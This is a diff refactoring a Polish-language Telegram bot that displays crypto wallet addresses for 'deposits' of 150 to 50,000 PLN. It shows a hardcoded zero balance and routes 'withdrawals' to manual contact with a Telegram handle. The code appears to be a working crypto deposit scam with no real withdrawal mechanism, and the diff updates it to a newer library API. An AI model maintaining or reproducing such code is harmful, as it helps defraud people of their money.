@@ -3,10 +3,9 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
-    CallbackContext,
     CallbackQueryHandler,
+    ContextTypes,
 )
-from telegram.constants import ParseMode
 import qrcode
 from io import BytesIO
 
@@ -33,7 +32,7 @@ withdraw_methods_buttons = [
 ]
 
 # --- HANDLERY ---
-async def start(update: Update, context: CallbackContext):
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("📥 Wpłać krypto", callback_data='deposit')],
         [InlineKeyboardButton("📤 Wypłać środki", callback_data='withdraw')],
@@ -41,7 +40,7 @@ async def start(update: Update, context: CallbackContext):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
-    photo_url = "https://imgur.com/a/3qUzKVy.jpg"  # Zmień na swój link do grafiki
+    photo_url = "https://imgur.com/a/3qUzKVy.jpg"  # Zmień na bezpośredni link do obrazka
 
     await update.message.reply_photo(
         photo=photo_url,
@@ -58,10 +57,10 @@ async def start(update: Update, context: CallbackContext):
             "👇 Wybierz opcję:"
         ),
         reply_markup=reply_markup,
-        parse_mode=ParseMode.HTML
+        parse_mode="HTML"
     )
 
-async def button_handler(update: Update, context: CallbackContext):
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
@@ -69,17 +68,14 @@ async def button_handler(update: Update, context: CallbackContext):
     if data == 'deposit':
         keyboard = [[InlineKeyboardButton(name, callback_data=f"crypto|{name}")] for name in crypto_wallets.keys()]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text("💰 Wybierz kryptowalutę do wpłaty:", reply_markup=reply_markup)
+        await query.message.reply_text("💰 Wybierz kryptowalutę do wpłaty:", reply_markup=reply_markup)
 
     elif data == 'withdraw':
         reply_markup = InlineKeyboardMarkup(withdraw_methods_buttons)
-        await query.edit_message_text("💸 Wybierz metodę wypłaty:", reply_markup=reply_markup)
+        await query.message.reply_text("💸 Wybierz metodę wypłaty:", reply_markup=reply_markup)
 
     elif data == 'balance':
-        await query.edit_message_text(
-            "<b>💰 Twoje saldo:</b>\n0.00 PLN",
-            parse_mode=ParseMode.HTML
-        )
+        await query.message.reply_text("<b>💰 Twoje saldo:</b>\n0.00 PLN", parse_mode="HTML")
 
     elif data.startswith("crypto|"):
         _, name = data.split("|")
@@ -98,20 +94,20 @@ async def button_handler(update: Update, context: CallbackContext):
                 f"<b>{name}</b>\n\n"
                 f"🔗 Adres portfela:\n<code>{address}</code>\n\n"
                 "📩 Wyślij min 150 PLN, max 50 000 PLN.\n"
-                "✅ Po wpłacie wróć i wybierz metodę wypłaty.",
+                "✅ Po wpłacie wróć i wybierz metodę wypłaty."
             ),
-            parse_mode=ParseMode.HTML
+            parse_mode="HTML"
         )
 
     elif data.startswith("withdraw|"):
         _, method = data.split("|")
-        await query.edit_message_text(
+        await query.message.reply_text(
             f"✅ Jeżeli wpłaciłeś swoje kryptowaluty, skontaktuj się z <a href='https://t.me/cocaine7_11'>@cocaine7_11</a> i wyślij mu potwierdzenie wysłania krypto.\n"
             "📨 Czekaj na odpowiedź.",
-            parse_mode=ParseMode.HTML
+            parse_mode="HTML"
         )
 
-async def check_admin(update: Update, context: CallbackContext):
+async def check_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return await update.message.reply_text("⛔ Brak dostępu.")
     await update.message.reply_text("🛡️ Panel admina — brak automatycznego monitoringu. Sprawdź saldo w portfelu ręcznie.")
